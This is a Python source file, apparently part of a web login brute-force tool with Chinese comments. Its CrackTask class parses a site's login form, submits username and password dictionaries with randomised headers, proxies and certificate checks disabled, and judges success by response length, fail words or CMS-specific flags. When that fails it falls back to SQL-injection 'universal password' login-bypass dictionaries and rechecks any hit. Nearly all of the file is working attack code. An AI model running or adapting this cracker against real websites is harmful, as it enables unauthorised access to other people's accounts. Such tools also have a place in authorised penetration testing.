import requests

from generator.dict import *
from generator.header import get_random_headers
from conf.config import *
import logs.log as Log
from parse.parser import Parser
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time


def get_res_length(res):
    # return len(res.text + str(res.headers))
    return len(res.text)


class CrackTask:
    id = 0
    url = ''
    parser = {}
    error_length = 0
    requests_proxies = {}
    timeout = 0
    fail_words = []
    test_username = ''
    test_password = ''
    conn = {}

    def __init__(self):
        # 加载配置文件
        self.requests_proxies = crackConfig["requests_proxies"]
        self.timeout = crackConfig["timeout"]
        self.fail_words = crackConfig["fail_words"]
        self.test_username = crackConfig["test_username"]
        self.test_password = crackConfig["test_password"]

    def run(self, id, url):
        self.id = id
        self.url = url
        print("")
        Log.init_log_id(id)
        Log.Info(f"[*] Start: {url}")
        try:
            self.parser = Parser(self.url)
            if not self.parser.run():
                return
            self.error_length = self.get_error_length()
            username_dict, password_dict = gen_dict(url)
            username, password = self.crack_task(username_dict, password_dict)
            # 万能密码爆破
            if not username and not password:
                if self.parser.cms:
                    sqlin_dict_enable = self.parser.cms["sqlin_able"]
                else:
                    sqlin_dict_enable = generatorConfig["dict_config"]["sqlin_dict"]["enable"]
                if sqlin_dict_enable:
                    Log.Info(f"[*] {url} 启动万能密码爆破模块")
                    sqlin_user_dict, sqlin_pass_dict = gen_sqlin_dict()
                    username, password = self.crack_task(sqlin_user_dict, sqlin_pass_dict)

            if username and password:
                Log.Info(f"[*] Rechecking... {url} {username} {password}")
                recheck_flag = self.recheck(username, password)
                if recheck_flag:
                    Log.Success(f"[+] Success: {url}  {username}/{password}")
                    return
                else:
                    Log.Info(f"[-] Recheck failed: {url}  {username}/{password}")
            Log.Error("[-] Failed: " + url)
        except Exception as e:
            Log.Error(f"{str(e)}")

    def crack_request(self, conn, username, password):
        data = self.parser.data
        path = self.parser.post_path
        data[self.parser.username_keyword] = username
        data[self.parser.password_keyword] = password
        res = conn.post(url=path, data=data, headers=get_random_headers(), timeout=self.timeout, verify=False,
                        allow_redirects=True, proxies=self.requests_proxies)
        time.sleep(crackConfig["delay"])
        res.encoding = res.apparent_encoding
        return res

    def get_error_length(self):
        conn = requests.session()
        self.conn = conn
        # pre_res = self.crack_request(conn, self.test_username, self.test_password)  # 预请求一次
        res1 = self.crack_request(conn, self.test_username, self.test_password)
        res2 = self.crack_request(conn, self.test_username, self.test_password)
        error_length1 = get_res_length(res1)
        error_length2 = get_res_length(res2)
        if error_length1 != error_length2:
            raise Exception(f"[-] {self.url} Error length 不为固定值")
        return error_length1

    def recheck(self, username, password):
        password = password.replace('{user}', username)
        conn = requests.session()
        # pre_res = self.crack_request(conn, self.test_username, self.test_password)  # 预请求一次
        res1 = self.crack_request(conn, self.test_username, self.test_password)
        res2 = self.crack_request(conn, username, password)
        error_length1 = get_res_length(res1)
        error_length2 = get_res_length(res2)

        if error_length1 == error_length2 or res2.status_code == 403:
            return False
        else:
            return True

    def crack_task(self, username_dict, password_dict):
        fail_words = self.fail_words
        conn = self.conn
        error_length = self.error_length
        num = 0
        dic_all = len(username_dict) * len(password_dict)
        for username in username_dict:
            for password in password_dict:
                right_pass = 1
                password = password.replace('{user}', username)
                num = num + 1
                Log.Info(f"[*] {self.url} 进度: ({num}/{dic_all}) checking: {username} {password}")
                res = self.crack_request(conn, username, password)
                html = res.text + str(res.headers)
                if self.parser.cms:
                    if self.parser.cms["success_flag"] and (self.parser.cms["success_flag"] in html):
                        return username, password
                    elif self.parser.cms["die_flag"] and (self.parser.cms["die_flag"] in html):
                        return False, False
                for fail_word in fail_words:
                    if fail_word in html:
                        right_pass = 0
                        break
                if right_pass:
                    cur_length = get_res_length(res)
                    if self.parser.username_keyword in res.text and self.parser.password_keyword in res.text:
                        continue
                    if cur_length != error_length:
                        return username, password
                else:
                    continue
        return False, False
